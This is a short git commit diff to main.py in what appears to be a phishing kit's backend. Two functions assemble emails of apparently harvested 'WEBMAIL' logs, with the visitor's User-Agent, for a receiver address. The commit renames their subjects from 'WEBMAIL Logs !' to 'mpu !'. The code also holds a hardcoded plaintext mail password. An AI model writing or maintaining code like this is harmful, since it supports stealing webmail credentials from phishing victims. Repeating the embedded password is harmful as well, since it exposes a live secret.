d47286101d86d28182df99f98020bf6f4248a26c
bobxuchina <bobxuchina.163@gmail.com>
2025-03-13 17:02:26 +0800

    Update main.py

--- main.py
+++ main.py
@@ -151,7 +151,7 @@ def first():
         password = "Account3487$@"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "WEBMAIL Logs !"
+        message["Subject"] = "mpu !"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -189,7 +189,7 @@ def second():
         password = "Account3487$@"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "WEBMAIL logs !! "
+        message["Subject"] = "mpu !! "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
